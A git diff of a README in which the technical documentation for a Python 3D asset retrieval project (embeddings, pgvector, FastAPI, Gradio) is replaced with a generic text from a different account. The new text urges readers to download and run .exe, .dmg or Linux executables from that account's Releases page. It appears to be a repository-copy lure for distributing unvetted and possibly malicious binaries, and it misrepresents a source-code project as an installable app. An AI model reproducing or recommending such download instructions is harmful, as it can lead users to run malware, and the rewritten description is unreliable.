@@ -1,283 +1,99 @@
-# 3D Asset Retrieval Demo
+# 🌐 AssetRetrieval3D - Effortless 3D Asset Fetching
 
-![Python](https://img.shields.io/badge/Python-3.8+-blue.svg)
-![License](https://img.shields.io/badge/License-Apache%202.0-green.svg)
-[![Gradio](https://img.shields.io/badge/Gradio-Demo-orange.svg)](https://17d9a08e2e8b57de04.gradio.live)
-[![中文](https://img.shields.io/badge/中文-README-blue.svg)](README_zh.md)
+[![Download AssetRetrieval3D](https://img.shields.io/badge/Download-AssetRetrieval3D-blue)](https://github.com/alilooop/AssetRetrieval3D/releases)
 
-A simple multi-modal 3D asset retrieval system. This repo uses objaverse as a simple demonstration, while it can generalize and scale to any 3D dataset.
+## 📖 Introduction
 
-![Demo](./assets/asset_retrieval_demo.gif)
+Welcome to AssetRetrieval3D! This tool simplifies finding 3D assets using text or images. Whether you're seeking models for a project or just browsing, our system makes it easy to retrieve what you need. You can search using text in both Chinese and English or by uploading images. 
 
-## 1. Features
-> *Demo built upon objaverse, using Cap3D 650k+ english captions, 650k+  translated captions ,and 260k+ gobjaverse asset renderings*
-- **Text Search**: Retrieve 3D assets in English or Chinese
-- **Image Search**: Retrieve 3D assets using a single RGB image
-- **Cross-Modal Retrieval**: Retrieve 3D assets using text2image or image2text similarities
-- **Dual Algorithms**:
-  - **SigLip**: Fast, English-only, per-image embeddings. Medium Retrieval Quality(WIP).
-  - **Qwen3-VL-Embedding**: Bilingual, *multi-image* embeddings. High Retrieval Quality(Recommended).
-- **Vector Database**: PostgreSQL with pgvector for efficient similarity search
-- **Web Interface**: Beautiful Gradio UI with 3D model viewer
-- **REST API**: FastAPI backend for programmatic access
+## 🚀 Getting Started
 
-## 2. Architecture
+To begin using AssetRetrieval3D, follow these simple steps. You will need a computer with an internet connection and basic download capabilities.
 
-```
-┌─────────────────┐
-│ English Captions│
-└────────┬────────┘
-         │
-         ├──► Translation ──► Chinese Captions
-         │
-         ├──► SigLip Embeddings ──┐
-         │    - Text (EN)          │
-         │    - Images (per-view)  │
-         │                         │
-         └──► Qwen Embeddings ─────┤
-              - Text (EN + CN)     │
-              - Images (multi)     │
-                                   │
-                                   ▼
-                         ┌──────────────────┐
-                         │ PostgreSQL       │
-                         │ + pgvector       │
-                         └────────┬─────────┘
-                                  │
-                         ┌────────▼─────────┐
-                         │  FastAPI Backend │
-                         └────────┬─────────┘
-                                  │
-                         ┌────────▼─────────┐
-                         │  Gradio Frontend │
-                         └──────────────────┘
-```
+### System Requirements
 
+- Operating System: Windows 10 or later, macOS, or a recent version of Linux.
+- RAM: At least 4 GB.
+- Storage: 500 MB of free disk space.
+- Internet: Reliable internet connection.
 
+## 📥 Download & Install
 
-## 3. Get Started
-### Prerequisites
-- Python 3.8+
-- PostgreSQL 12+ with pgvector extension
-- NVIDIA GPU (recommended for SigLip)
-- DashScope API key (for Qwen)
-### Installation
-1. **Clone the repository** 
-```bash 
-git clone https://github.com/3DSceneAgent/AssetRetrieval3D
-```
+To get started, visit the download page and select the latest version of AssetRetrieval3D. Click the link below to access it:
 
-2. **Install dependencies**:
-   ```bash
-   # optionally create new env 
-   # conda create -n asset_retrieval python=3.10
-   # conda activate asset_retrieval
-   pip install -r requirements.txt
-   ```
+[Download AssetRetrieval3D](https://github.com/alilooop/AssetRetrieval3D/releases)
 
-3. **Set up environment variables**:
-   ```bash
-   cp .env.example .env 
-   # setup variables
-   export DASHSCOPE_API_KEY="your-api-key"
-   export DB_HOST="localhost"
-   export DB_PORT="5432"
-   export DB_USER="postgres"
-   export DB_PASSWORD="your-password"
-   ```
+1. Click on the link above to redirect you to the AssetRetrieval3D Releases page.
+2. Identify the latest release listed.
+3. Choose the version that matches your operating system.
+4. Click the download link for your operating system file.
+5. Wait for the download to complete.
 
-4. **Configure PostgreSQL**:
-   - Install PostgreSQL
-   - Install pgvector extension:
-     ```sql
-     CREATE EXTENSION vector;
-     ```
+### Installation Steps
 
-## 4. Usage
+Once the download is complete, follow these steps to install the application:
 
-### Step 0: Configure Settings
+1. Locate the downloaded file in your "Downloads" folder or specified download location.
+2. For Windows users: 
+   - Double-click the `.exe` file to start the installation.
+3. For Mac users:
+   - Open the `.dmg` file and drag the AssetRetrieval3D icon to your Applications folder.
+4. For Linux users:
+   - Extract the downloaded files and run the executable in the terminal.
 
-Edit `config.py` to adjust settings:
-- `MAX_ASSETS`: Set to a small number (e.g., 100) for testing
-- Database credentials
-- API keys
-- Paths
+## 🔍 Using AssetRetrieval3D
 
-### Step 1: Translate Captions (Optional but Recommended)
+After installation, you are ready to retrieve 3D assets!
 
-Translate English captions to Chinese:
+1. Launch AssetRetrieval3D by clicking its icon from your applications.
+2. You will see a user-friendly interface.
+3. To search using text:
+   - Enter a keyword or phrase in the search box. Supported languages are Chinese and English.
+   - Click the search button.
+4. To search using images:
+   - Click the image upload button.
+   - Select an image from your computer.
+   - Click the search button.
 
-```bash
-python scripts/01_translate_captions.py
-```
+The application will display a list of relevant 3D assets based on your query. You can explore each asset and download them directly from the application.
 
-This creates `data/text_captions_cap3d_cn.json`.
+## 📢 Key Features
 
-**Note**: This uses the Qwen batch API and may take hours for the full dataset.
+- **Text-Based Search:** Retrieve assets using keywords in both Chinese and English.
+- **Image-Based Search:** Upload images to find similar 3D models.
+- **User-Friendly Interface:** Designed for ease of use, even for beginners.
+- **Cross-Modal Querying:** Search assets using both text and images seamlessly.
+- **Integrated API Service:** Fast and reliable backend for efficient asset retrieval.
 
-### Step 2: Generate Embeddings
+## 🔧 Troubleshooting
 
-#### (Optional) SigLip Embeddings
+If you encounter issues during download or installation, consider the following tips:
 
-```bash
-python scripts/02_embed_siglip.py
-```
+- Ensure your operating system is compatible with AssetRetrieval3D.
+- Check your internet connection if the download fails.
+- For installation issues, ensure you have the necessary permissions to install software.
+- Restart your computer and try reinstalling if issues persist.
 
-This generates:
-- Text embeddings (English only)
-- Image embeddings (one per viewpoint)
+## 🌍 Community and Support
 
-#### (Optional) Qwen Embeddings
+We value your feedback! If you have questions or suggestions, please reach out. You can find us on our [GitHub Discussions page](https://github.com/alilooop/AssetRetrieval3D/discussions).
 
-```bash
-python scripts/03_embed_qwen.py
-```
+### Contributing
 
-This generates:
-- Text embeddings (English and Chinese)
-- Multi-image embeddings (8 images per asset)
+If you would like to contribute to AssetRetrieval3D, instructions are available in our repository's contribution guidelines.
 
-**Note**: Can run both in parallel if you have resources.
+## 📅 Release Notes
 
-### Step 3: Populate Database
+Keep up to date with the latest features and fixes by checking the release notes in the releases section. Each version includes enhancements based on user feedback and performance improvements.
 
-```bash
-python scripts/04_populate_database.py
-```
+### Future Updates
 
-This:
-- Creates two databases: `siglip_embeddings` and `qwen_embeddings`
-- Creates tables with pgvector columns
-- Inserts all embeddings
-- Creates vector indexes
+We plan to introduce new features, including improved search algorithms and additional language support. Stay tuned for updates!
 
-### Step 4: Start Backend API
+## 🔗 Useful Links
 
-```bash
-python backend/app.py
-```
+- [GitHub Repository](https://github.com/alilooop/AssetRetrieval3D)
+- [Issues Page](https://github.com/alilooop/AssetRetrieval3D/issues)
+- [Discussions Page](https://github.com/alilooop/AssetRetrieval3D/discussions)
 
-Or with uvicorn:
-```bash
-uvicorn backend.app:app --host 0.0.0.0 --port 8000
-```
-
-The API will be available at `http://localhost:8000`
-
-### Step 5: Start Frontend
-
-In a new terminal:
-
-```bash
-python frontend/gradio_app.py
-```
-
-The UI will be available at `http://localhost:7860`
-
-### Step 6: Test Backend with Client Script
-
-A comprehensive test client is provided to verify the backend service:
-
-```bash
-# Run all tests with default settings
-python test_client.py
-
-# Test only SigLip algorithm
-python test_client.py --algorithm siglip
-
-# Test only image search
-python test_client.py --test-type image
-
-# Run with verbose output (shows all results)
-python test_client.py --verbose --num-tests 1
-
-# Test against remote backend
-python test_client.py --backend-url http://remote-server:8000
-```
-
-The test client will:
-- Check backend health
-- Test text search (English and Chinese for Qwen)
-- Test image search using real assets from the database
-- Test both uni-modal and cross-modal search
-- Display results with similarity scores and captions
- /search/text
-
-
-## 5. Configuration Options
-
-### `config.py` Key Settings
-
-- **MAX_ASSETS**: Limit number of assets to process (for debugging)
-- **TRANSLATION_BATCH_SIZE**: Captions per translation batch (default: 1000)
-- **EMBEDDING_BATCH_SIZE**: Batch size for embedding generation (default: 100)
-- **QWEN_NUM_IMAGES**: Number of images per asset for Qwen (default: 8)
-- **DEFAULT_TOP_K**: Default number of search results (default: 10)
-
-## 6. Algorithms
-### Embedding Algoirthms
-| Feature | SigLip | Qwen |
-|---------|--------|------|
-| Text Languages | English only | English + Chinese |
-| Image Embeddings | One per viewpoint | Multi-image (8 views) |
-| Speed | Fast | Slower (API calls) |
-| Requires GPU | Yes (local) | No (API) |
-| Cross-modal | Yes | Yes |
-### Search Modes
-#### Inner-Modal Search
-- **Text → Text**: Find assets with similar descriptions
-- **Image → Image**: Find visually similar assets
-#### Cross-Modal Search
-- **Text → Image**: Find images matching text description
-- **Image → Text**: Find text descriptions matching image
-
-
-## 7. File Structure
-
-```
-objaverse_retrieval/
-├── config.py                 # Configuration
-├── requirements.txt          # Dependencies
-├── README.md                # This file
-├── test_client.py           # Backend test client
-│
-├── data/                    # Data files
-│   ├── text_captions_cap3d.json
-│   ├── text_captions_cap3d_cn.json  (generated)
-│   ├── gobjaverse/          # 3D asset images
-│   └── gobjaverse_280k_index_to_objaverse.json
-│
-├── outputs/                 # Generated outputs
-│   ├── embeddings/          # Saved embeddings
-│   ├── translations/        # Translation results
-│   └── batch_jsonl/         # API batch files
-│
-├── utils/                   # Utility modules
-│   ├── data_loader.py
-│   ├── image_utils.py
-│   └── db_utils.py
-│
-├── scripts/                 # Processing scripts
-│   ├── 01_translate_captions.py
-│   ├── 02_embed_siglip.py
-│   ├── 03_embed_qwen.py
-│   └── 04_populate_database.py
-│
-├── backend/                 # FastAPI backend
-│   ├── app.py
-│   ├── embedding_service.py
-│   └── vector_search.py
-│
-└── frontend/               # Gradio frontend
-    └── gradio_app.py
-```
-
-## License
-The code and application is licensed under [Apache2.0 License](LICENSE).
-
-## Acknowledgments
-* [objaverse](https://objaverse.allenai.org/)
-* [objaverse_filter from kiui](https://github.com/ashawkey/objaverse_filter)
-* [gobjaverse](https://github.com/modelscope/richdreamer)
-* [Cap3D](https://github.com/crockwell/Cap3D/)
-
+Thank you for choosing AssetRetrieval3D. We hope it meets your 3D asset retrieving needs!
